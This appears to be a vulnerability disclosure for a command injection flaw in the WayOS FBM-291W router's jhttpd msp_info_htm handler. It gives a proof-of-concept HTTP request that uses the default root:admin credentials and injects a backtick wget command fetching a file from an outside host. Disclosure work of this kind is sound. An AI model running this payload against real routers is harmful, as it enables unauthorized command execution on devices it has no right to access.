Firmware Name: FBM_291W-19.09.11V.trx 

- Model: FBM-291W 

-  Version: 19.09.11

- Test Environment: Ubuntu 18.04 

- offical website:https://www.wayos.com/

  download link:https://www.wayos.com/product/jiatingzuwang/jiayongwuxian/jiatingwifituijian/2355.html





  FBM-291W is a multi-WAN wireless gigabit behavior management router designed for coffee shops, small to medium-sized businesses, chain organizations, and home environments. It features outstanding internet behavior management functions. It has 128M memory and 16M flash memory. The router not only supports Viman's fourth-generation smart QoS, behavior management, smart WiFi, VPN connection, and security defense functions, but also supports intelligent wireless technology, dual-band 2.4GHz and 5G wireless, and wireless transmission rates up to 1200Mbps. The application of these functions will bring great convenience to managers and is an ideal choice for smart WiFi network solutions. There is a command execution vulnerability in its jhttpd's msp_info_htm function.

affect version:

![image](https://github.com/user-attachments/assets/8cbebe2c-f3e7-4296-9a3b-0bed7653b9cc)










![image](https://github.com/user-attachments/assets/b863218f-eaba-4fe6-96b7-1cc58303b218)


![image](https://github.com/user-attachments/assets/4a3498e5-6b80-4642-b7d9-3efad7ebec33)




exploit: 

After logging in with the default password root:admin, accessing the msp_info.htm page, and crafting carefully constructed parameters, it is possible to execute commands.
poc

```
GET /msp_info.htm?flag=cmd&cmd=`wget%20http://192.168.0.2:8000/test.txt` HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Connection: close

Cookie: userid=root; gw_userid=root,gw_passwd=94B830FE0CCD890946AE1C8318A2BE7B

Upgrade-Insecure-Requests: 1


```

![image](https://github.com/user-attachments/assets/410e26ee-98e5-46da-8b11-f2eb6676342c)
